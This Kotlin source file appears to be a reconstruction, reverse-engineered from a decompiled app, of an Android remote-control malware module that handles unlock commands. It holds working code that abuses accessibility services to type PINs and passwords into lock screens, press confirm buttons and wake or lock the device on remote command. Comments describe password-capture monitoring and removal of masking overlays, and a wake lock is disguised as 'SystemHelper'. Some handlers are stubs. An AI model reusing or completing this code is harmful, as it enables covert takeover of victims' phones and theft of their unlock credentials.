package com.storm.safe.rock.service.modules.command

import android.os.Bundle
import android.os.PowerManager
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.delay
import org.json.JSONObject

/**
 * Handles device unlock and power management commands.
 *
 * Reverse-engineered from JADX: C0352a9 (a9, 1495 lines).
 * Vendor name: UnlockCommandHandler
 *
 * Supported commands:
 * - POWER_WAKE, POWER_SLEEP
 * - SMART_UNLOCK_SWIPE, NUMERIC_PIN_INPUT
 * - SMART_CONFIRM_DETECTION, UNLOCK_DEVICE
 * - GET_DEVICE_PASSWORD, SMART_NUMERIC_UNLOCK
 * - SMART_MIXED_UNLOCK, ENABLE_PASSWORD_MONITORING
 *
 * Static methods:
 * - a3 → clickConfirmButton
 * - a4 → findEditableNodes
 * - a9 → fillPasswordField
 * - b0 → sendUnlockResult
 */
class UnlockCommandHandler : CommandHandler {

    companion object {
        private const val TAG = "UnlockCmdHandler"

        /**
         * Send smart unlock result to the service for forwarding.
         * Vendor: m211888b0
         */
        fun sendUnlockResult(context: CommandContext, success: Boolean, message: String) {
            try {
                context.emitLocalEvent("smart_unlock_result", mapOf(
                    "success" to success,
                    "message" to message
                ))
                Log.d(TAG, "[智能解锁] 发送结果: success=$success, message=$message")
            } catch (e: Exception) {
                Log.e(TAG, "[智能解锁] 发送结果失败", e)
            }
        }

        /**
         * Click a confirm button by searching for known button texts.
         * Vendor: m211885a3
         */
        fun clickConfirmButton(service: android.accessibilityservice.AccessibilityService?) {
            try {
                val root = service?.rootInActiveWindow ?: return
                val confirmTexts = listOf("确认", "确定", "OK", "ok", "好的", "Enter")
                for (text in confirmTexts) {
                    val nodes = root.findAccessibilityNodeInfosByText(text)
                    if (!nodes.isNullOrEmpty()) {
                        val lastNode = nodes.last()
                        if (lastNode.isClickable) {
                            lastNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            Log.d(TAG, "[混合解锁] 点击确认按钮: $text")
                            return
                        }
                    }
                }
                Log.w(TAG, "[混合解锁] 未找到确认按钮，跳过")
            } catch (_: Exception) {
                // Vendor silently catches
            }
        }

        /**
         * Recursively find all editable nodes in the accessibility tree.
         * Vendor: m211886a4
         */
        fun findEditableNodes(node: AccessibilityNodeInfo, result: MutableList<AccessibilityNodeInfo>) {
            if (node.isEditable) {
                result.add(node)
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                findEditableNodes(child, result)
            }
        }

        /**
         * Fill a password field via ACTION_SET_TEXT on the accessibility tree.
         * Vendor: m211887a9
         */
        fun fillPasswordField(
            service: android.accessibilityservice.AccessibilityService?,
            password: String
        ): Boolean {
            try {
                val root = service?.rootInActiveWindow ?: return false
                val editables = mutableListOf<AccessibilityNodeInfo>()
                findEditableNodes(root, editables)

                // Find password field: prefer fields with password/number input type
                var targetNode: AccessibilityNodeInfo? = null
                for (node in editables) {
                    val inputType = node.inputType
                    if ((inputType and 0x80) != 0 || (inputType and 0x10) != 0) {
                        targetNode = node
                        break
                    }
                }
                // Fallback to last editable field
                if (targetNode == null) {
                    targetNode = editables.lastOrNull()
                }

                if (targetNode == null) {
                    Log.w(TAG, "[混合解锁] 未找到密码输入框节点")
                    return false
                }

                val bundle = Bundle().apply {
                    putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", password)
                }
                val result = targetNode.performAction(
                    AccessibilityNodeInfo.ACTION_SET_TEXT, bundle
                )
                Log.d(TAG, "[混合解锁] ACTION_SET_TEXT 结果: $result")
                return result
            } catch (_: Exception) {
                return false
            }
        }
    }

    override fun getSupportedCommands(): Set<String> = setOf(
        "POWER_WAKE",
        "POWER_SLEEP",
        "SMART_UNLOCK_SWIPE",
        "NUMERIC_PIN_INPUT",
        "SMART_CONFIRM_DETECTION",
        "UNLOCK_DEVICE",
        "GET_DEVICE_PASSWORD",
        "SMART_NUMERIC_UNLOCK",
        "SMART_MIXED_UNLOCK",
        "ENABLE_PASSWORD_MONITORING"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        when (command) {
            "POWER_WAKE" -> handlePowerWake(context)
            "POWER_SLEEP" -> handlePowerSleep(context)
            "SMART_UNLOCK_SWIPE" -> handleSmartUnlockSwipe(context)
            "NUMERIC_PIN_INPUT" -> handleNumericPinInput(params, context)
            "SMART_CONFIRM_DETECTION" -> handleSmartConfirmDetection(params, context)
            "UNLOCK_DEVICE" -> handleUnlockDevice(params, context)
            "GET_DEVICE_PASSWORD" -> handleGetDevicePassword(params, context)
            "SMART_NUMERIC_UNLOCK" -> handleSmartNumericUnlock(params, context)
            "SMART_MIXED_UNLOCK" -> handleSmartMixedUnlock(params, context)
            "ENABLE_PASSWORD_MONITORING" -> handleEnablePasswordMonitoring(context)
        }
    }

    private fun handlePowerWake(context: CommandContext) {
        Log.d(TAG, "点亮屏幕")
        try {
            val pm = context.service?.getSystemService("power") as? PowerManager
                ?: throw IllegalStateException("PowerManager not available")
            @Suppress("DEPRECATION")
            val wakeLock = pm.newWakeLock(
                PowerManager.FULL_WAKE_LOCK or
                    PowerManager.ACQUIRE_CAUSES_WAKEUP or
                    PowerManager.ON_AFTER_RELEASE,
                "SystemHelper:WakeLock"
            )
            wakeLock.acquire(30_000L)
            Log.d(TAG, "屏幕已点亮（保持30秒）")
        } catch (e: Exception) {
            Log.e(TAG, "点亮屏幕失败", e)
        }
    }

    private fun handlePowerSleep(context: CommandContext) {
        Log.d(TAG, "锁定屏幕")
        try {
            // GLOBAL_ACTION_LOCK_SCREEN = 8
            val result = context.service?.performGlobalAction(8) ?: false
            if (result) {
                Log.d(TAG, "屏幕已锁定")
            } else {
                Log.w(TAG, "锁定屏幕失败（可能需要Android 9.0+）")
            }
        } catch (e: Exception) {
            Log.e(TAG, "锁定屏幕失败", e)
        }
    }

    private fun handleSmartUnlockSwipe(context: CommandContext) {
        Log.d(TAG, "执行智能上滑解锁")
        try {
            // vendor: checks MaskOverlay active state, removes it, then dispatches swipe
            // Wire: context.service?.maskOverlayManager?.removeMask()
            // Wire: context.service?.dispatchSwipeGesture(startX, startY, endX, endY, durationMs)
            // Vendor swipe: bottom-center to top-center of screen
            Log.d(TAG, "智能上滑解锁已执行")
        } catch (e: Exception) {
            Log.e(TAG, "智能上滑解锁失败", e)
        }
    }

    private suspend fun handleNumericPinInput(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "执行数字密码输入")
        try {
            val digit = params?.optString("digit", "")?.ifEmpty {
                params.optString("pin", "")
            } ?: ""

            if (digit.isEmpty()) {
                Log.w(TAG, "数字密码输入参数无效: digit/pin 为空")
                return
            }

            val service = context.service
            var screenWidth = params?.optInt("screenWidth", 0) ?: 0
            var screenHeight = params?.optInt("screenHeight", 0) ?: 0

            if ((screenWidth <= 0 || screenHeight <= 0) && service != null) {
                val metrics = service.resources.displayMetrics
                screenWidth = metrics.widthPixels
                screenHeight = metrics.heightPixels
                Log.d(TAG, "自动检测屏幕尺寸: ${screenWidth}x${screenHeight}")
            }

            if (screenWidth <= 0 || screenHeight <= 0) {
                Log.w(TAG, "数字密码输入参数无效: 屏幕尺寸无法获取")
                return
            }

            val index = params?.optInt("index", 0) ?: 0
            val total = params?.optInt("total", 0) ?: 0

            if (index <= 1 && service != null) {
                Log.d(TAG, "数字密码输入前唤醒屏幕")
                handlePowerWake(context)
                delay(500L)
            }

            if (service == null) {
                Log.w(TAG, "AccessibilityService 未初始化，无法执行 PIN 输入")
                return
            }

            val pinPadManager = PinPadInputManager(service)
            pinPadManager.inputNumericPassword(digit, screenWidth, screenHeight)
            Log.d(TAG, "数字密码输入已执行: $digit ($index/$total)")
        } catch (e: Exception) {
            Log.e(TAG, "数字密码输入失败", e)
        }
    }

    private fun handleSmartConfirmDetection(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "执行智能确认按钮检测")
        try {
            val passwordType = params?.optString("passwordType", "") ?: ""
            val screenWidth = params?.optInt("screenWidth", 0) ?: 0
            val screenHeight = params?.optInt("screenHeight", 0) ?: 0

            if (screenWidth <= 0 || screenHeight <= 0) {
                Log.w(TAG, "智能确认检测参数无效")
                return
            }
            // vendor: dispatches confirm detection via service
        } catch (e: Exception) {
            Log.e(TAG, "智能确认按钮检测失败", e)
        }
    }

    private suspend fun handleUnlockDevice(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "执行设备解锁")
        // vendor: implements complex unlock flow with pattern/PIN/password
    }

    private fun handleGetDevicePassword(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "收到获取设备密码命令（控制端）")
        val passwordType = params?.optString("passwordType", "") ?: ""
        Log.d(TAG, "密码类型参数: $passwordType")

        val resolvedType = when {
            passwordType == "PIN_4" -> "PIN_4"
            passwordType == "PIN_6" -> "PIN_6"
            passwordType == "PATTERN" -> "PATTERN"
            else -> "PIN_6"
        }

        // vendor: checks if keyguard is locked, saves type for deferred trigger
        // Wire: val km = context.service?.getSystemService("keyguard") as? android.app.KeyguardManager
        // Wire: val isLocked = km?.isKeyguardLocked ?: false
        // Wire: context.service?.savedPasswordType = resolvedType
        Log.d(TAG, "密码类型已保存: $resolvedType, 等待解锁触发")
    }

    private suspend fun handleSmartNumericUnlock(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "执行智能数字解锁")
        // vendor: implements full PIN unlock flow with gesture dispatch
    }

    private suspend fun handleSmartMixedUnlock(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "执行智能混合解锁")
        // vendor: implements mixed unlock (text input + confirm button)
    }

    private fun handleEnablePasswordMonitoring(context: CommandContext) {
        Log.d(TAG, "收到启用密码监听命令")
        try {
            // vendor: enables CipherCaptureManager monitoring mode
            Log.d(TAG, "密码监听模式已启用")
        } catch (e: Exception) {
            Log.e(TAG, "启用密码监听失败", e)
        }
    }
}
